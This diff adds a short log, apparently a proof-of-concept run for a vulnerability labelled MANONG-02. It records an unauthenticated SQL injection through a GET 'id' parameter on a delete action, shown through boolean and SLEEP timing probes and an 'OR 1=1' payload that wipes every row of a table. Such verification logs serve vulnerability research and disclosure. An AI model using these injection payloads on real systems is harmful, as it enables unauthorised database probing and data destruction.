@@ -1,0 +1,12 @@
+=== MANONG-02: unauth SQLi / arbitrary delete via GET id (a=del) ===
+3
+[boolean] id=3 AND 1=1:
+{"res":1}
+[boolean] id=3 AND 1=2:
+{"res":0}
+[SLEEP] id=1 AND SLEEP(4) timing:
+elapsed=5s (control below)
+control elapsed=0s
+[arbitrary wipe] re-seed 3 rows then id=1 OR 1=1:
+{"res":1}
+cache rows after OR 1=1: 0
